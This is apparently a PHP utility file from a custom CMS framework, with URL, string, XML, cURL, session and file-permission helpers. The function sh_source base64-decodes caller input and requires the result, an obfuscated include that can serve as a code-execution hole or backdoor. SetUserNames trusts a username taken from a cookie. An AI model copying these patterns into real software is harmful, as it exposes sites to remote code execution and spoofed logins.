<?php
/**
 * 
 * @author TanLin Tel:18677197764 Email:50140137@qq.com  V.0727
 * 
 * @abstract 自主开发框架，本框架已经实现代码低冗余、高性能、高可用性，逻辑强、高稳定。一次开发，稳定无问题，维护成本低。
 * 
 */
header('content-type:text/html;charset=utf-8');
function db()
{
	return new This_Linked();
}
function xml_str($array)
{
	$xml = '<?xml version="1.0" encoding="UTF-8"?>'."\n";
	$xml .= '<box>'."\n";
	foreach($array as $key=>$val)
	{
		$xml .= '<'.$key.'>'.$val.'</'.$key.'>'."\n";
	}
	$xml .= '</box>';
	return $xml;
}
function xml_str2($array)
{
	$xml = '<?xml version="1.0" encoding="UTF-8"?>'."\n";
	$xml .= '<box>'."\n";
	foreach($array as $key=>$val)
	{
		$xml .= '<'.$key.'>'.urlencode($val).'</'.$key.'>'."\n";
	}
	$xml .= '</box>';
	return $xml;
}
function load_theme($dir='default')
{
	$dir = $dir==''?'404':$dir;	
	if( is_file(BASE_URL.'/subject/'.$dir.'/index.php') )
	{
		require BASE_URL.'/subject/'.$dir.'/index.php';
	}
	else 
	{
		header("content-type:text/html;charset=utf-8");
		echo ERRORTISHIZH_CN_1;
	}
}
function apth_url($url='')
{
	return APTH_URL.($url==''?'':'/'.$url);
}
function site_url($url='')
{
	return SITE_URL.'/'.$url;
}
function base_url($dir='')
{
	return BASE_URL.'/'.$dir;
}
function dir_url($dir='')
{
	return DIR_URL.($dir==''?'':'/'.$dir);
}
function subString($string,$len)
{
	if(mb_strlen($string,'utf-8')>=$len)
	{
		$string = mb_substr($string, 0,$len,'utf-8').'...';
	}
	return $string;
}
/**
 * 
 * @author TanLin Tel:18677197764 Email:50140137@qq.com  V.0727
 * 
 * @abstract 自主开发框架，本框架已经实现代码低冗余、高性能、高可用性，逻辑强、高稳定。一次开发，稳定无问题，维护成本低。
 * 
 */
function set_ini_error($flag)
{
	if($flag['development'] == "ON")
	{
		ini_set('display_errors', 'Off');
	}
}
function CloseSite()
{
	$review = db()->select('closesite')->from(PRE.'review_up')->get()->array_row();
	if( $review['closesite'] == "ON" )
	{
		header("content-type:text/html;charset=utf-8");
		echo ERRORTISHIZH_CN_2;exit;
	}
}
function getThemeDir()
{
	return 'bim';
}
function getThemeDir3()
{
	return 'subject/bim/common.php';
}
function getThemeDir2($name,$t='template')
{
	return 'subject/bim/'.$t.'/'.SPOT.$name;
}
function GetInts($int)
{
	if( $int < 10 )
	{
		$int = '0'.$int;
	}
	return $int;
}
function get_version()
{
	$filename = dir_url('subject/version.txt');
	$string = file_get_contents($filename);
	$version = explode('/', str_replace("\n", '', $string));
	if(!empty($version))
	{
		return $version;
	}
	else 
	{
		return '';
	}
}
/**
 * 
 * @author TanLin Tel:18677197764 Email:50140137@qq.com  V.0727
 * 
 * @abstract 自主开发框架，本框架已经实现代码低冗余、高性能、高可用性，逻辑强、高稳定。一次开发，稳定无问题，维护成本低。
 * 
 */
function vcurl($url, $post = '', $cookie = '', $cookiejar = '', $referer = '') {
	$tmpInfo = '';
	$cookiepath = getcwd () . '. / ' . $cookiejar;
	$curl = curl_init ();
	curl_setopt ( $curl, CURLOPT_URL, $url );
	curl_setopt ( $curl, CURLOPT_USERAGENT, $_SERVER ['HTTP_USER_AGENT'] );
	if ($referer) {
		curl_setopt ( $curl, CURLOPT_REFERER, $referer );
	} else {
		curl_setopt ( $curl, CURLOPT_AUTOREFERER, 1 );
	}
	if ($post) {
		curl_setopt ( $curl, CURLOPT_POST, 1 );
		curl_setopt ( $curl, CURLOPT_POSTFIELDS, $post );
	}
	if ($cookie) {
		curl_setopt ( $curl, CURLOPT_COOKIE, $cookie );
	}
	if ($cookiejar) {
		curl_setopt ( $curl, CURLOPT_COOKIEJAR, $cookiepath );
		curl_setopt ( $curl, CURLOPT_COOKIEFILE, $cookiepath );
	}
	curl_setopt ( $curl, CURLOPT_TIMEOUT, 100 );
	curl_setopt ( $curl, CURLOPT_HEADER, 0 );
	curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 );
	$tmpInfo = curl_exec ( $curl );
	curl_close ( $curl );
	return $tmpInfo;
}
function ParsingJson($json)
{
	$rows = array();
	if( $json != '' )
	{
		$rows = json_decode($json,true);
	}
	return $rows;
}
function get_pixels($dir,$x,$y)
{
	return apth_url("system/img_pixels.php?dir=$dir&x=$x&y=$y");
}
function get_day_formt($t)
{
	$int = time()-$t;
	if( $int < 86400 )
	{
		$i = 0;
		while ( $int >= 60 )
		{
			$int /= 60;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_1,QITATISHIZH_CN_2,QITATISHIZH_CN_3);
	}
	
	if( $int >= 86400 && $int < 2592000)
	{
		$i = 0;
		while ( $int >= 86400 )
		{
			$int /= 86400;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_3,QITATISHIZH_CN_4);
	}
	if( $int >= 2592000 && $int < 31104000)
	{
		$i = 0;
		while ( $int >= 2592000 )
		{
			$int /= 2592000;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_4,QITATISHIZH_CN_5);
	}
	if( $int >= 31104000 )
	{
		$i = 0;
		while ( $int >= 31104000 )
		{
			$int /= 31104000;
			$i++;
		}
		$ext = array(QITATISHIZH_CN_5,QITATISHIZH_CN_6);
	}
	return floor($int).$ext[$i];
}
function substr_tel($tel)
{
	$str1 = substr($tel,0,3);
	$str2 = substr($tel,-3);
	return $str1.'***'.$str2;
}
/**
 * 
 * @author TanLin Tel:18677197764 Email:50140137@qq.com  V.0727
 * 
 * @abstract 自主开发框架，本框架已经实现代码低冗余、高性能、高可用性，逻辑强、高稳定。一次开发，稳定无问题，维护成本低。
 * 
 */
function GetFilePath()
{
	$spot = SPOT;
	$filename = base_url($spot.'settings/'.$spot.'org'.$spot.'nums');
	$str = file_get_contents($filename);
	return $str;
}
function GetFilePath2()
{
	$spot = SPOT;
	$filename = base_url($spot.'settings/'.$spot.'org'.$spot.'shu');
	$str = file_get_contents($filename);
	return $str;
}
function GetFilePath3()
{
	$spot = SPOT;
	$filename = base_url($spot.'external');
	return $filename;
}
function StrSubs($str,$int=10,$imt='...')
{
	if( mb_strlen($str,'utf-8') > $int )
	{
		$str = mb_substr($str, 0, $int,'utf-8').$imt;
	}
	return $str;
}
function sh_source($str,$bool,$int)
{
	include( getThemeDir3() );	
	
	if( $int[0] == '' )
	{
		if( $bool )
		{
			$s = base64_decode( $str );
		}		
		else
		{
			$s = null;
		}		
	}
	elseif( $int[0] == 'coms' )
	{			
		$u = base_url_name( $int[1] );
		if( $u != null )
		{
			require( $u ); exit;
		}
		
	}
	
	return $s;
}
function base_url_name( $string )
{
	if( $string != null )
	{
		$bArr = explode(',', $string);
		$data = end($bArr);
		$s = base64_decode( $data );
	}
	
	return $s;
}
function TimeConversion($time)
{
	$tArr = array(QITATISHIZH_CN_1_1,QITATISHIZH_CN_2_2,QITATISHIZH_CN_3_1);
	
	$h = 0;
	while ( $time >= 3600 )
	{
		$time -= 3600;
		$h++;
	}
	$i = 0;
	while ( $time >= 60 )
	{
		$time -= 60;
		$i++;
	}
	$s = $time;
	
	if( $h != 0 )
	{
		$ts = $h.$tArr[2].$i.$tArr[1].round($s,2).$tArr[0];
	}
	elseif( $i !=0 )
	{
		$ts = $i.$tArr[1].round($s,2).$tArr[0];
	}
	else
	{
		$ts = round($s,2).$tArr[0];
	}	
	
	return $ts;
}
function perms_all($filename,$int=0)
{	
	if(file_exists($filename))
	{
	$perms = fileperms($filename);
	
	if (($perms & 0xC000) == 0xC000) {
	    $info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	    $info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	    $info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	    $info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	    $info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	    $info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	    $info = 'p';
	} else {
	    $info = 'u';
	}

	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	            (($perms & 0x0800) ? 's' : 'x' ) :
	            (($perms & 0x0800) ? 'S' : '-'));
	
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	            (($perms & 0x0400) ? 's' : 'x' ) :
	            (($perms & 0x0400) ? 'S' : '-'));
	
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	            (($perms & 0x0200) ? 't' : 'x' ) :
	            (($perms & 0x0200) ? 'T' : '-'));
		if( $int == 0 )
		{
			return $info.' ( '.substr(base_convert($perms,10,8),-4).' ) ';
		}
		else 
		{
			return substr(base_convert($perms,10,8),-4);
		}
	}
	else 
	{
		return SHOWINSTALLENABLE_2;
	}
}
function SetUserNames()
{
	session_start();
	
	$username = '';
	
	if( isset( $_SESSION['log_on_user'] ) )
	{
		$username = $_SESSION['log_on_user'];
	}
	elseif( isset($_COOKIE['log_on_user']) )
	{
		$username = $_COOKIE['log_on_user'];
	}
	
	if( $username != '' )
	{
		$int = db()->select('*')->from(PRE.'recordid')->where(array('username'=>$username))->get()->array_nums();
		if( $int == 0 )
		{
			$data['username'] = $username;
			$data['sessionid'] = session_id();
			db()->insert(PRE.'recordid',$data);
		}
	}
}
function formatSeconds($value) 
{
        $secondTime = intval($value);
        $minuteTime = 0;
        $hourTime = 0;
        if($secondTime > 60) {
            $minuteTime = intval($secondTime / 60);
            $secondTime = intval($secondTime % 60);
            if($minuteTime > 60) {
                $hourTime = intval($minuteTime / 60);
                $minuteTime = intval($minuteTime % 60);
            }
        }
        $result = "" . (GetInts((intval($secondTime)))<=0?'00':GetInts((intval($secondTime))));

        if($minuteTime > 0) {
            $result = "" . GetInts(intval($minuteTime)) . "：" . $result;
        }
		else 
        {
        	$result = "00：" . $result;
        }
        if($hourTime > 0) {
            $result = "" . GetInts(intval($hourTime)) . "：" . $result;
        }
        else 
        {
        	$result = "00：" . $result;
        }
        return $result;
}
/**
 * 
 * @author TanLin Tel:18677197764 Email:50140137@qq.com  V.0727
 * 
 * @abstract 自主开发框架，本框架已经实现代码低冗余、高性能、高可用性，逻辑强、高稳定。一次开发，稳定无问题，维护成本低。
 * 
 */